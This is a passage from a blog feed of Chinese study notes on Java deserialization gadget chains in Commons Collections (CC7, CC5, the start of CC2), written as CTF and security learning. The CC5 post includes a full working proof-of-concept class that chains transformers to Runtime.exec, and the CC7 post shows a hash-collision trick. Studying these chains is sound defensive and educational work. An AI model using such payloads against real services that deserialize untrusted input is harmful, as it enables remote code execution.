6版本是6u221。其中，公开版本的最新版6u45仍然存在这条利用链，大概是6u51的时候修复了这个漏洞，但是这个结论不能肯定，因为免费用户下载不到这个版本。</li><li>JDK8在发布时，JDK7已经修复了这个问题，所以JDK8全版本都不受影响</li></ol></li><li><em><strong>Q: JDK7u21以上的版本如何修复这个问题?</strong></em><ol><li><a href="https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e">修复源码变动</a>: 简单来说就是<strong>对type的检查</strong>，但是这个修改其实导致了后续的jdk8u20</li><li>在 sun.reflect.annotation.AnnotationInvocationHandler 类的readObject函数中，原本有一个对 this.type 的检查，在其不是AnnotationType的情况下，会抛出一个异常。但是，捕获到异常后没有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程</li><li>新版中，将 <code>return;</code> 修改成 <code>throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</code> ，这样，反序列化时会出现一个异常，导致整个过程停止</li></ol></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li>老大蛇了</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(9)_CC7</title>
      <link href="/2024/11/21/Java%E5%AE%89%E5%85%A85(9)_CC7/"/>
      <url>/2024/11/21/Java%E5%AE%89%E5%85%A85(9)_CC7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>1小时速通？</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ol><li>只是复现版本</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JDK</span></span><br><span class="line">jdk7u21</span><br><span class="line"></span><br><span class="line"><span class="comment">// CC库</span></span><br><span class="line">Commons-Collections版本：<span class="number">3.1</span></span><br></pre></td></tr></table></figure><h2 id="从CC1到CC7"><a href="#从CC1到CC7" class="headerlink" title="从CC1到CC7"></a>从CC1到CC7</h2><ol><li><p><strong>Gadget Chain先上了</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain</span></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">        org.apache.commons.collections.map.AbstractMapDecorator.equals  <span class="comment">//  这里是通过java.util.HashMap调用的，AbstractMapDecorator是LazyMap装饰器调用的，底层map是java.util.HashMap</span></span><br><span class="line">            java.util.AbstractMap.equals    <span class="comment">// 从这往下就是CC1中的LazyMap的链子了</span></span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">                            java.lang.reflect.Method.invoke</span><br><span class="line">                                sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">                                    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">                                        sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">                                            java.lang.Runtime.exec</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC7-poc"><a href="#CC7-poc" class="headerlink" title="CC7 poc"></a>CC7 poc</h2><ol><li><p>依旧是先写poc再回去</p></li><li><p>小小分析</p><ol><li><p>Hashtable其实是一个map，readObject中调用了，可以获取其他对象的readObject，但是没有用，为什么不直接read他们的object呢？所以渠道reconstitutionPut()里</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">    <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>利用思路</p><ol><li>通过再Hashtable中的key为一个LazyMap，readObject是调用AbstractMap的equals并于一个Map对象比较，equals中有<code>value.equals(m.get(key))</code>，这里的m就是传入的map，可以调用到LazyMap的链子</li></ol></li><li><p>条件</p><ol><li><p>readObject这一步没有什么需要注意的</p></li><li><p>Hashtable的中，<code>((e.hash == hash) &amp;&amp; e.key.equals(key))</code>很关键，由于短路逻辑，要使得e.hash&#x3D;&#x3D;hash，或者从goon功能上理解: <code>Makes sure the key is not already in the hashtable</code></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>失败了，自己没想出来</strong>，看一下别人的poc，<strong>有黑魔法卧槽</strong>，有趣，有了这个点后就很容易想了，结合详细的hashCode解析可以看<code>Q: &quot;aa&quot;...</code></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有趣的黑魔法</span></span><br><span class="line">System.out.println(<span class="string">&quot;aa&quot;</span>.hashCode()==<span class="string">&quot;bB&quot;</span>.hashCode());</span><br><span class="line">System.out.println(<span class="string">&quot;yy&quot;</span>.hashCode()==<span class="string">&quot;zZ&quot;</span>.hashCode());</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="Q-”aa”-hashCode-字符串哈希魔法背后的原理"><a href="#Q-”aa”-hashCode-字符串哈希魔法背后的原理" class="headerlink" title="Q: *”aa”.hashCode()字符串哈希魔法背后的原理?"></a>Q: *”aa”.hashCode()字符串哈希魔法背后的原理?</h2><ol><li><p>这里使用的hashCode()方法有一个31，敏感的我们马上就能想到ascii中大小字母的关系了，小写和大写之间</p><ol><li>当h长度为2时有</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在LazyMap中查看它的hashCode，因为他是key</p><ol><li>都从0开始，hashCode取决于内部存放的东西，再看看HashMap中的Entry.hashCode()返回的异或bro</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractMap.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">        h += i.next().hashCode();</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (key==<span class="literal">null</span>   ? <span class="number">0</span> : key.hashCode()) ^</span><br><span class="line">            (value==<span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Q-为什么最后需要lazyMap-remove-aa"><a href="#Q-为什么最后需要lazyMap-remove-aa" class="headerlink" title="Q: 为什么最后需要lazyMap.remove(&quot;aa&quot;);?"></a>Q: 为什么最后需要<code>lazyMap.remove(&quot;aa&quot;);</code>?</h2><blockquote><p>这里也是学到了调试方法：先粗后细(先看结果再研究过程，因为怪结果会一层一层向上传递，机制有些像异常)，包括那个黑魔法(虽然要研究到机理是要细的，但是先用出来啊混蛋)<br>条件ok了可能在编写poc时会出现一些新的意外比如这里的get()调用，还是要靠调试</p></blockquote><ol><li><p>因为这里的euqals最后会调用到<code>LazyMap.get()</code>方法</p><ol><li>观察到如果不contains会调用put()</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Q-为什么这里要构造”aa”和”bB”而不能输入相同的呢"><a href="#Q-为什么这里要构造”aa”和”bB”而不能输入相同的呢" class="headerlink" title="Q: 为什么这里要构造”aa”和”bB”而不能输入相同的呢?"></a>Q: 为什么这里要构造”aa”和”bB”而不能输入相同的呢?</h2><h2 id="Undone-顺序问题"><a href="#Undone-顺序问题" class="headerlink" title="Undone: 顺序问题"></a>Undone: 顺序问题</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(8)_CC5</title>
      <link href="/2024/11/21/Java%E5%AE%89%E5%85%A85(8)_CC5/"/>
      <url>/2024/11/21/Java%E5%AE%89%E5%85%A85(8)_CC5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一小时CC5，冲冲冲</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ol><li>CC2后记得把环境配置回来Bro</li><li>配置如下<ol><li>老CC库3.1可以执行（其它未知）</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java</span></span><br><span class="line">jdk8u66</span><br><span class="line">    <span class="comment">// jdk7u21中BadAttributeValueExpException没有readObject()方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// maven</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="紧接CC1-LazyMap"><a href="#紧接CC1-LazyMap" class="headerlink" title="紧接CC1_LazyMap"></a>紧接CC1_LazyMap</h2><ol><li><p>先给一波Gadget Chain再去分析</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget chain:</span></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        TiedMapEntry.toString()</span><br><span class="line">            TiedMapEntry.getValue()</span><br><span class="line">                LazyMap.get()   <span class="comment">// 从这一段开始就是CC1的链子了</span></span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure></li></ol><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><h2 id="小小poc"><a href="#小小poc" class="headerlink" title="小小poc"></a>小小poc</h2><ol><li>先写poc在回去分析<ol><li>CC1_LazyMap调用链还是那样进行构造，这里不需要用到动态代理</li><li>序列化的对象是一个BadAttr…对象，其中获取的valObj需要是一个TiedMapEntry对象，调用toString()，<strong>req1: <code>System.getSecurityManager() == null</code></strong></li><li>来到TiedMapEntry中，getValue中调用了<code>map.get(key)</code>触发代理，成功执行payload，<strong>req2: TiedlMapEntry实例的Map是LazyMap</strong>，key在LazyMap中会自动调用<code>transform(key)</code></li><li>成功构造，一气呵成，发现信工所大佬也是这样写的，ok</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Notes</span></span></span><br><span class="line"><span class="comment"> *  1. 与其他使用jdk7u21不同，CC5链使用jdk8u66进行复现</span></span><br><span class="line"><span class="comment"> *  2. 这里使用的是老的CC包</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5_bfengj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    , <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazymap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构造新的链子，上面是CC1_LazyMap后半段链子 * * * * * */</span></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">toStringObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">            <span class="type">BadAttributeValueExpException</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;placeholder&quot;</span>);</span><br><span class="line">                <span class="comment">// 注意到，这里不能直接设置 new BadAttributeValueExpException(toStringObj)，因为在构造函数中有toString()，反射</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            val.set(triggerObj, toStringObj);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(triggerObj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();    <span class="comment">// 这里如果注释掉不会弹出来计算器，但是要是不注释就会弹，说明正确的</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>信工所大佬</li><li><a href="https://xz.aliyun.com/t/13046?time__1311=GqmhBKYIxfox/D0lb50QmWm2DgQfSAeD">一篇挺全的博客</a></li><li>ysoserial后续同一分析吧</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(7)_CC2</title>
      <link href="/2024/11/20/Java%E5%AE%89%E5%85%A85(7)_CC2/"/>
      <url>/2024/11/20/Java%E5%AE%89%E5%85%A85(7)_CC2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>现在学习一条链是越来越快了，不错，一个半小时争取拿下CC2</p></blockquote><h2 id="CC链之法也"><a href="#CC链之法也" class="headerlink" title="*CC链之法也"></a>*CC链之法也</h2><ol><li><p>commons-collections中找Gadget的过程，实际上可以简化为找⼀条从 Serializable#readObject() ⽅法到 Transformer#transform()⽅法的调⽤链，然后通过<code>Transformer#transform()</code>方法调用我们构造的恶意代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Serializable#readObejct()</span><br><span class="line">    <span class="comment">// Your Gadget Here ...</span></span><br><span class="line">    Transformer#transform()</span><br></pre></td></tr></table></figure></li></ol><h2 id="commons-collections4和commons-collections"><a href="#commons-collections4和commons-collections" class="headerlink" title="commons-collections4和commons-collections"></a>commons-collections4和commons-collections</h2><ol><li>这里的commons-collections4并不是一条利用链，而是Apache Commons Collections的两个分支版本(groupId和artifactId都变了): 前者是Commons Collections⽼的版本包；后<br>者是官⽅在2013年推出的4版本<ol><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ol></li><li>在maven仓库中搜索有下<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85(7)_CC2/%E4%B8%A4%E4%B8%AACC%E5%BA%93.png" alt="maven repo"></li></ol></li></ol><blockquote><p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中</p></blockquote><h2 id="流水的CC包but铁打的CC链"><a href="#流水的CC包but铁打的CC链" class="headerlink" title="流水的CC包but铁打的CC链"></a>流水的CC包but铁打的CC链</h2><h3 id="环境配置如下"><a href="#环境配置如下" class="headerlink" title="环境配置如下"></a>环境配置如下</h3><ol><li>可以换成ali源</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Old-CC-in-Commons-collections4-pocs"><a href="#Old-CC-in-Commons-collections4-pocs" class="headerlink" title="Old CC in Commons-collections4 pocs"></a>Old CC in Commons-collections4 